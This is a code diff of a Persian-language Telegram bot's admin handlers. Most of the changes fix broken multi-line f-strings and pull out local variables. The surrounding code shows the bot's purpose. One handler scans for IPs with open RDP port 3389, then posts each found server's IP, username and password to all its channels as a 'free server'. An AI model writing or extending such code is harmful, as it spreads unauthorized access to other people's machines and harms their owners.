@@ -26,12 +26,8 @@ async def show_control(event: Message | CallbackQuery):
     status = "⏸ PAUSED" if posting_paused else "▶️ ACTIVE"
 
     text = (
-        f"⚙️ *System Control*
-
-"
-        f"📢 Posting status: *{status}*
-
-"
+        f"⚙️ *System Control*\n\n"
+        f"📢 Posting status: *{status}*\n\n"
         "Select an action:"
     )
     await msg.answer(text, parse_mode="Markdown", reply_markup=control_kb())
@@ -120,20 +116,13 @@ async def ctrl_scan_channels(callback: CallbackQuery):
             name = ch.get("title") or ch.get("username") or "بدون نام"
             report_lines.append(f"  • {name}")
 
-    channels_list = "
-".join(report_lines[:20]) if report_lines else "  (هیچ کانالی پیدا نشد)"
+    channels_list = "\n".join(report_lines[:20]) if report_lines else "  (هیچ کانالی پیدا نشد)"
 
     text = (
-        f"📡 *نتیجه اسکن کانال‌ها*
-
-"
-        f"🔍 پیدا شده: `{total_found}` کانال
-"
-        f"✅ ثبت جدید: `{total_added}` کانال
-
-"
-        f"*کانال‌های یافت‌شده:*
-{channels_list}"
+        "📡 *نتیجه اسکن کانال‌ها*\n\n"
+        f"🔍 پیدا شده: `{total_found}` کانال\n"
+        f"✅ ثبت جدید: `{total_added}` کانال\n\n"
+        f"*کانال‌های یافت‌شده:*\n{channels_list}"
     )
     await callback.message.answer(text, parse_mode="Markdown", reply_markup=back_kb())
 
@@ -166,11 +155,8 @@ async def ctrl_post_now(callback: CallbackQuery):
         await asyncio.sleep(10)
 
     text = (
-        f"✅ پست فوری انجام شد
-
-"
-        f"📤 موفق: `{success}` کانال
-"
+        "✅ پست فوری انجام شد\n\n"
+        f"📤 موفق: `{success}` کانال\n"
         f"❌ ناموفق: `{failed}` کانال"
     )
     await callback.message.answer(text, parse_mode="Markdown", reply_markup=back_kb())
@@ -180,9 +166,7 @@ async def ctrl_post_now(callback: CallbackQuery):
 async def ctrl_rdp_post_now(callback: CallbackQuery):
     """Send a free RDP/server post immediately to all active channels."""
     status_msg = await callback.message.answer(
-        "🖥 *در حال اسکن برای سرور رایگان...*
-
-"
+        "🖥 *در حال اسکن برای سرور رایگان...*\n\n"
         "⏳ اسکنر در حال جستجوی IP با پورت 3389 باز است. چند ثانیه صبر کنید...",
         parse_mode="Markdown",
     )
@@ -199,10 +183,7 @@ async def ctrl_rdp_post_now(callback: CallbackQuery):
     except Exception as e:
         logger.error("admin_rdp_scan_failed", error=str(e))
         await status_msg.edit_text(
-            f"❌ *خطا در اسکن:*
-`{str(e)[:200]}`
-
-"
+            f"❌ *خطا در اسکن:*\n`{str(e)[:200]}`\n\n"
             "اسکنر نتوانست IP پیدا کند.",
             parse_mode="Markdown",
             reply_markup=back_kb(),
@@ -211,11 +192,8 @@ async def ctrl_rdp_post_now(callback: CallbackQuery):
 
     if not rdp_result:
         await status_msg.edit_text(
-            "⚠️ *هیچ سرور بازی پیدا نشد.*
-
-"
-            "اسکنر همه کشورها را بررسی کرد ولی پورت 3389 باز پیدا نکرد.
-"
+            "⚠️ *هیچ سرور بازی پیدا نشد.*\n\n"
+            "اسکنر همه کشورها را بررسی کرد ولی پورت 3389 باز پیدا نکرد.\n"
             "دوباره امتحان کنید.",
             parse_mode="Markdown",
             reply_markup=back_kb(),
@@ -235,19 +213,19 @@ async def ctrl_rdp_post_now(callback: CallbackQuery):
         seed=seed,
     )
 
+    country_flag = rdp_result["country_flag"]
+    country_name = rdp_result["country_name"]
+    ip = rdp_result["ip"]
+    port = rdp_result["port"]
+    username = rdp_result["username"]
+    password = rdp_result["password"]
+
     await status_msg.edit_text(
-        f"✅ *سرور پیدا شد!* {rdp_result['country_flag']} {rdp_result['country_name']}
-
-"
-        f"🔗 IP: `{rdp_result['ip']}`
-"
-        f"🔌 Port: `{rdp_result['port']}`
-"
-        f"👤 User: `{rdp_result['username']}`
-"
-        f"🔑 Pass: `{rdp_result['password']}`
-
-"
+        f"✅ *سرور پیدا شد!* {country_flag} {country_name}\n\n"
+        f"🔗 IP: `{ip}`\n"
+        f"🔌 Port: `{port}`\n"
+        f"👤 User: `{username}`\n"
+        f"🔑 Pass: `{password}`\n\n"
         "📤 *در حال ارسال به همه کانال‌ها...*",
         parse_mode="Markdown",
     )
@@ -291,36 +269,29 @@ async def ctrl_rdp_post_now(callback: CallbackQuery):
         try:
             await publish_post(session, post)
             await session.commit()
-            published_count = len(channels)
             logger.info(
                 "admin_rdp_post_sent",
-                channels=published_count,
-                ip=rdp_result["ip"],
-                country=rdp_result["country_name"],
+                channels=len(channels),
+                ip=ip,
+                country=country_name,
             )
         except Exception as e:
             post.status = "failed"
             await session.commit()
             logger.error("admin_rdp_post_send_failed", error=str(e))
             await status_msg.edit_text(
-                f"❌ *خطا در ارسال:*
-`{str(e)[:300]}`",
+                f"❌ *خطا در ارسال:*\n`{str(e)[:300]}`",
                 parse_mode="Markdown",
                 reply_markup=back_kb(),
             )
             return
 
     await status_msg.edit_text(
-        f"✅ *پست سرور رایگان ارسال شد!*
-
-"
-        f"🌍 کشور: {rdp_result['country_flag']} {rdp_result['country_name']}
-"
-        f"🔗 IP: `{rdp_result['ip']}`
-"
-        f"📡 کانال‌ها: `{len(channels)}` کانال
-"
-        f"🖼 با تصویر: ✅",
+        f"✅ *پست سرور رایگان ارسال شد!*\n\n"
+        f"🌍 کشور: {country_flag} {country_name}\n"
+        f"🔗 IP: `{ip}`\n"
+        f"📡 کانال‌ها: `{len(channels)}` کانال\n"
+        "🖼 با تصویر: ✅",
         parse_mode="Markdown",
         reply_markup=back_kb(),
     )
@@ -388,17 +359,11 @@ async def cmd_scan_channels(message: Message):
             name = ch.get("title") or ch.get("username") or "بدون نام"
             report_lines.append(f"  • {name}")
 
-    channels_list = "
-".join(report_lines[:20]) if report_lines else "  (هیچ کانالی پیدا نشد)"
+    channels_list = "\n".join(report_lines[:20]) if report_lines else "  (هیچ کانالی پیدا نشد)"
     text = (
-        f"📡 *نتیجه اسکن*
-
-"
-        f"🔍 پیدا شده: `{total_found}`
-"
-        f"✅ ثبت جدید: `{total_added}`
-
-"
+        "📡 *نتیجه اسکن*\n\n"
+        f"🔍 پیدا شده: `{total_found}`\n"
+        f"✅ ثبت جدید: `{total_added}`\n\n"
         f"{channels_list}"
     )
     await message.answer(text, parse_mode="Markdown", reply_markup=back_kb())
